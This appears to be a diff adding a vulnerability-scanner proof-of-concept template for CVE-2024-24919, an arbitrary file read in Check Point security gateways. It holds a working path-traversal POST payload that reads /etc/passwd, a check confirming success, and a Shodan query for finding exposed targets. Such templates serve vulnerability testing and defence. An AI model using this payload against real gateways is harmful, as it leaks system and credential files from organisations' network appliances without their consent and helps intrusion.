@@ -1,0 +1,17 @@
+id: poc-yaml-check-point-security-gateway-mycrl-anyfile-read
+info:
+  name: Check Point安全网关 MyCRL 任意文件读取漏洞(CVE-2024-24919)
+  severity: high
+  tags:
+  - CVE-2024-24919
+  - 两高一弱
+  finger: checkpoint
+  shodan: html:"Check Point SSL Network"
+requests:
+- method: POST
+  path: /clients/MyCRL
+  data: aCSHELL/../../../../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"Check Point\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
